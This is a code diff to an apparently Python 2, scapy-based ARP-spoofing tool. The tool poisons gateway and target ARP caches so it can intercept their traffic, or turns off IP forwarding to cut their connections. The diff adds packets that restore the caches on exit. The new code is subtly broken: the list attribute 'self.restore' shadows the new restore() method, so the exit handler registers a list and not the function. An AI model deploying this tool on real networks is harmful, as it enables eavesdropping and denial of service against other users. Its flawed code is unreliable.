@@ -79,6 +79,7 @@ class NetCmd:
     self.gateway    = None
     self.gateway_hw = None
     self.packets    = []
+    self.restore    = []
     self.endpoints  = []
 
     if not os.geteuid() == 0:
@@ -132,6 +133,9 @@ class NetCmd:
     for target in self.targets:
       self.packets.append( Ether( dst = self.gateway_hw ) / ARP( op = "who-has", psrc = target[1],    pdst = self.gateway ) )
       self.packets.append( Ether( dst = target[0] )       / ARP( op = "who-has", psrc = self.gateway, pdst = target[1] ) )
+      # and packets to restore the cache later
+      self.restore.append( Ether( src = target[0],       dst = self.gateway_hw ) / ARP( op = "who-has", psrc = target[1],    pdst = self.gateway ) )
+      self.restore.append( Ether( src = self.gateway_hw, dst = target[0] )       / ARP( op = "who-has", psrc = self.gateway, pdst = target[1] ) )
 
     if not kill:
       print "@ Enabling ipv4 forwarding system wide ..."
@@ -140,8 +144,19 @@ class NetCmd:
       print "@ Disabling ipv4 forwarding system wide to kill target connections ..."
       self.__set_forwarding( False )
     
-    atexit.register( self.__set_forwarding, False )
+    atexit.register( self.restore )
+    
+  def restore( self ):
+    os.write( 1, "@ Restoring ARP cache " )
+    for i in range(5):
+      for packet in self.restore:
+        sendp( packet, iface_hint = self.gateway )
+      os.write( 1, '.' )
+      time.sleep(1)
+    os.write( 1, "\n" )
 
+    self.__set_forwarding( False )
+    
   def spoof( self ):
     for packet in self.packets:
       sendp( packet, iface_hint = self.gateway )
